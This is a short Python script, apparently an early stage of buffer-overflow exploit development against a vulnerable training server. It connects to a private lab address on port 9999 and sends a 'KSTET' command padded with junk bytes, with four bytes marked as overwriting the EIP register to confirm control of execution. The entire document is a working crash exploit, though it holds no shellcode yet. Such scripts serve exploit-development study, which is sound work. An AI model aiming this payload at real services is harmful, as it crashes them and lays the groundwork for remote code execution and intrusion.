import socket
import struct

TCP_IP = '192.168.56.120'
TCP_PORT = 9999


payload = "KSTET /.:/"
payload += "A" * 66 # Junk
payload += "B" * 4 # Overwrite EIP
payload += "D" * (5990 - len(payload)) # Junk
	
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

s.send(payload)
s.close()	